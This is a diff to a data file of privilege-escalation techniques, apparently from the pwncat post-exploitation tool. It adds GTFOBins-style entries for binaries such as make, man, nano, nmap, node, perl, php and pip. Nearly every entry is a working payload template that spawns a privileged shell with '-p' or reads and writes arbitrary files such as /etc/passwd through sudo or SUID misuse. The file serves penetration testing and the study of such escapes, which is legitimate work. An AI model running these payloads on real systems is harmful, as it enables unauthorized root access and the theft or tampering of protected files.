@@ -503,8 +503,6 @@
 			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d);echo \"import sys; sys.stdout.buffer.write(open('{lfile}', 'rb').read())\" > $TF/setup.py; {command} $TF 2>/dev/null | {tail} -n +4",
 			"args": []
 		},
-		// This seems to write small files... but not large (over ~4 KB). So we won't use it... ???
-		// easy_install does not give the process stdin, so we need to swap it into a different file, /tmp/b64.
 		{
 			"type": "write",
 			"stream": "base64",
@@ -611,7 +609,7 @@
 			"args": ["-c", "\"spawn {cat} {lfile}; interact\""]
 		}
 		// Theoretically we should be able to get File Write for this.
-		// Sine it has it own little subprocess, I can't seem to get stdin to funnel in. 
+		// Since it has it own little subprocess, I can't seem to get stdin to funnel in. 
 	],
 //-------------------------------------------------------------------
 	"facter": [
@@ -748,7 +746,6 @@
 			"args": ["-q", "-nx", "-ex", "'python import sys; open(\"{lfile}\",\"w\").write(sys.stdin.read())'", "-ex", "quit"],
 			"exit": "{ctrl_d}{ctrl_d}"
 		},
-		// We SHOULD be able to write base64 data... but for the life of me, I cannot get the whole file to come through. Leaving this alone.
 		{
 			"type": "write",
 			"stream":"base64",
@@ -1197,14 +1194,510 @@
 			"args": ["file://{lfile}"]
 		}
 	],
+//-------------------------------------------------------------------
+	"mail": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["--exec='!{shell}'"]
+		}
 
+		// This secondary method is not really tested.... 
+		// It may work on a "non-GNU" version?
+		// Not sure if the input is what would activate the shell.
+		// I will leave it disabled for now.
+		// {
+		// 	"type": "shell",
+		// 	"payload": "TF=$({mktemp}); echo \"From nobody@localhost Fri 29 May 2020 11:16:00 PM EDT\" > $TF; {command}",
+		// 	"input": "!{shell}\n",
+		// 	"args": ["-f", "$TF"],
+		// 	"exit":"exit\n{ctrl_c}",
+		// }
+	],
+//-------------------------------------------------------------------
+	"make": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-s", "--eval=$'x:\\n\\t-'\"{shell} -p\""]
+		}
 
+		// This also theoretically has support for file write ---
+		// but GTFObins says "requires a newer GNU make version."
+		// Since it can get a shell just fine, pwncat can unlock 
+		// the write capability on
+	],
+//-------------------------------------------------------------------
+	"man": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["man"],
+			"input": "!{shell}\n",
+			"exit": "exit\nq"
+		}
 
+		// Man can also file read...
+		// but it ruins the width of the file, like /etc/passwd is squished.
+		// We can use MANWIDTH variable but it does not work for syntax like:
+		//     MANWIDTH=1000 man /etc/passwd
+		// One method to get proper width is:
+		//     man man
+		//     :e /etc/passwd
+		// but then I cannot get this to stdout....
+	],
+//-------------------------------------------------------------------
+	"mawk": [
+		{
+			"type": "shell",
+			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} // {lfile}"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+		}
+	],
+//-------------------------------------------------------------------
+	"more": [
+		// This may fail with sudo because it may not be able to
+		// maintain the environment.
+		{
+			"type": "shell",
+			"payload": "TERM= {command} /etc/passwd",
+			"input": "!{shell}",
+			"exit": "exit\nq"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} {lfile} | {cat}"
+		}
+	],
+//-------------------------------------------------------------------
+	"mtr": [
+		// This will fail in dash/ash because of the line substitution.
+		// It may be best to just remove this...?
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "{command} | | while read line; do echo ${line:28:-27}; done",
+			"args": ["--raw", "-F", "{lfile}"]
+		}
+	],
 
+//-------------------------------------------------------------------
+	"mv": [
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -u); {base64} -d > $TF; {command}; {rm} -f $TF",
+			"args": ["$TF", "{lfile}"]
+		}
+	],
 
+//-------------------------------------------------------------------
+	"nano": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-s", "'{shell} -p'"],
+			"input": "{shell} -p\n{ctrl_t}",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		},
 
+		// If for some reason the -s technique above fails,
+		// try setting the SPELL environment variable.
+		{
+			"type": "shell",
+			"payload": "SPELL='{shell} -p' {command}",
+			"args": [],
+			"input": "{shell} -p\n{ctrl_t}",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		}
 
+		// Nano could potentially file read, but I cannot think of
+		// a good way to get the buffer into standard output.
+		// Nano can DEFINITELY file write... 
+		//     base64 -d | nano - # with an input to save the file
+		// But since it can get a shell, it can unlock write
+		// capability just after.
+	],
+//-------------------------------------------------------------------
+	"nawk": [
+		{
+			"type": "shell",
+			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} // {lfile}"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+		}
+	],
+//-------------------------------------------------------------------
+	"nice": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell} -p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"nl": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} | while read line; do echo $line; done",
+			"args": ["-bn", "-w1", "-s", "''", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"nmap": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'os.execute(\"{shell} -p\")' > $TF; {command}; {rm} -f $TF",
+			"input": "reset\n",
+			"args": ["--script=$TF"]
+		}
 
+		// nmap can do some janky file read and file write with lua.
+		// Since a shell can be obtained, pwncat can unlock these
+		// capabilities.
+	],
+//-------------------------------------------------------------------
+	"node": [
+		{
+			"type": "shell",
+			"payload": "{command}",	
+			"args": ["-e", "'require(\"child_process\").spawn(\"{shell}\", [\"-p\"], {{stdio: [0, 1, 2]}});'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"nohup": [
+		{
+			"type": "shell",
+			"payload": "{command}",	
+			"args": ["{shell}", "-p", "-c", "\"{shell} -p  <$({tty}) >$({tty}) 2>$({tty})\""]
+		}
+	],
+//-------------------------------------------------------------------
+	"nroff": [
+		{
+			// This may not behave with sudo since it needs the environment set
+			"type": "shell",
+			"payload": "TF=$({mktemp} -d); echo '#!{shell} -p' > $TF/groff; echo '{shell} -p' >> $TF/groff; chmod +x $TF/groff; GROFF_BIN_PATH=$TF {command}",
+			"args": []
+		}
+	],
+//-------------------------------------------------------------------
+	"nsenter": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell} -p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"od": [
+
+		// This uses a ton of other dependencies...
+		// sed, head, tr, echo...
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "echo -e $({command} -An -c -w9999 {lfile} | {sed} \"s/   /\\n/g\" | {tr} -d \"\\n\") | {head} -n -1",
+			"args": [""]
+		}
+	],
+//-------------------------------------------------------------------
+	"openssl": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["enc", "-in", "{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{base64} -d | {command}",
+			"args": ["enc", "-out", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"pdb": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -u); echo 'import os; os.system(\"{shell} -p\"); exit(0)' > $TF; {command}; {rm} -f $TF",
+			"args": ["$TF"],
+			"input": "cont\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"perl": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-e", "'exec \"{shell} -p\"'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"pg": [
+		{
+			"type": "shell",
+			"payload": "{command} /etc/profile",
+			"input": "!{shell} -p\n\n",
+			"exit": "exit\nq"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} | {cat}",
+			"args": ["{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"pager": [
+		{
+			"type": "shell",
+			"payload": "{command} /etc/profile",
+			"input": "!{shell} -p\n\n",
+			"exit": "exit\nq"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} | {cat}",
+			"args": ["{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"php": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'system(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'passthru(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-r", "'echo(file_get_contents(\"{lfile}\"));'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"php5": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'system(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'passthru(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-r", "'echo(file_get_contents(\"{lfile}\"));'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"php7": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'system(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'passthru(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-r", "'echo(file_get_contents(\"{lfile}\"));'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"php7.0": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'system(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'passthru(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-r", "'echo(file_get_contents(\"{lfile}\"));'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"php7.3": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'system(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'passthru(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-r", "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-r", "'echo(file_get_contents(\"{lfile}\"));'"]
+		}
+	],
+//-------------------------------------------------------------------
+	"pic": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-U"],
+			"input": ".PS\nsh X {shell} X\n",
+			"exit": "exit\n{ctrl_c}"
+		}
+	],
+//-------------------------------------------------------------------
+	"pico": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-s", "'{shell} -p'"],
+			"input": "{shell} -p\n{ctrl_t}",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		},
+
+		// If for some reason the -s technique above fails,
+		// try setting the SPELL environment variable.
+		{
+			"type": "shell",
+			"payload": "SPELL='{shell} -p' {command}",
+			"args": [],
+			"input": "{shell} -p\n{ctrl_t}",
+			// Exit the shell, then exit nano
+			"exit": "exit\n{ctrl_x}n"
+		}
+
+		// Nano could potentially file read, but I cannot think of
+		// a good way to get the buffer into standard output.
+		// Nano can DEFINITELY file write... 
+		//     base64 -d | nano - # with an input to save the file
+		// But since it can get a shell, it can unlock write
+		// capability just after.
+	],
+//-------------------------------------------------------------------
+	"pip": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}",
+			"args": ["install", "$TF"]
+		}
+	],
+//-------------------------------------------------------------------
+	"pip3": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}",
+			"args": ["install", "$TF"]
+		}
+	],
 
 //-------------------------------------------------------------------
 	"pry": [
@@ -1369,9 +1862,18 @@
 		}
 	],
 //-------------------------------------------------------------------
-// redcarpet could be implemented to read files, but since it is 
-// originally used to process Markdown files, it prepends and appends
-// HTML paragraph tags to output. This can be problematic.
+	"redcarpet": [
+		{
+			// redcarpet could be implemented to read files, but since it is 
+			// originally used to process Markdown files, it prepends and appends
+			// HTML paragraph tags to output. This COULD be problematic....
+			// I've stripped them out with `sed` as a dependency
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} | {sed} 's/^<p>//g' | {sed} 's|</p>$||g'",
+			"args": ["{lfile}"]
+		}
+	],
 
 //-------------------------------------------------------------------
 // restic can be implemented, but all it has is file upload.
@@ -1671,7 +2173,7 @@
 		//   LFILE=file_to_write
 		//   sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
 		// but getting this as stdin might be difficult. Since it already
-		// has shell capabaility, it can write after-the-fact and I won't
+		// has shell capability, it can write after-the-fact and I won't
 		// try to finagle this.
 	],
 //-------------------------------------------------------------------
